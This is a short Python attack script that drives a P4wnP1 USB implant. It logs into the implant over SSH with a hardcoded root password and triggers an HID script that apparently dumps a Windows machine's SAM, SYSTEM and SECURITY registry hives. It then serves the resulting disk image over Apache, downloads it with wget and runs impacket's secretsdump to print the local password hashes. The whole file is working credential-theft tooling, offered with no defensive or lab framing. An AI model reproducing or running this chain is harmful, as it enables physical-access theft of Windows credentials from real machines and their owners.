import os 
import time 

os.system("sshpass -p \"toor\" ssh -f root@172.24.0.1 \"P4wnP1_cli hid run -n extract-sam-system-security.js\"") #run "extract-sam-system-security.js"hid script 
time.sleep(45) # delay 45 sec
os.system("sshpass -p \"toor\" ssh -f root@172.24.0.1 \"cp /usr/local/P4wnP1/ums/flashdrive/100mb.bin /var/www/html\"") # copy the ums disk)of P4wnP1 (.bin) on apache directory
time.sleep(20) # delay 20 sec
os.system("sshpass -p \"toor\" ssh -f root@172.24.0.1 \"service apache2 start\"") # start apache
time.sleep(17)
os.system("wget http://172.24.0.1/100mb.bin") # download the ums disk of P4wnP1 
os.system("7z x 100mb.bin") # extract "sam", "security", "system" files from the .bin disk
time.sleep(1) # delay 1 sec
os.system("python impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL") # run secretdump.py from impacket directory 
os.system("python impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL > outputsecretdump.txt") # save the output of secretdump

time.sleep(7) # delay 7 sec

os.system("clear") # clear
print("\n\nHASH : \n") 
with open('outputsecretdump.txt') as f: 
    for i, line in enumerate(f):

        if 4 < i < 10:
            print(line.strip()) # display hash :)

